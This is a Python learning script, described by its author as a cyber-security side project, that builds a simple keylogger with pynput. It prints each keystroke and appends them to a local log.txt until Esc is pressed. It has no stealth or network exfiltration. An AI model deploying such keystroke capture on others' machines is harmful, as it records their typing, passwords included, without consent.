""""
Author: Gio Raso
Description: Making a key logger as a side project to help learn about cyber sercurity
"""
import pynput

from pynput import keyboard
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print('{0}'.format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
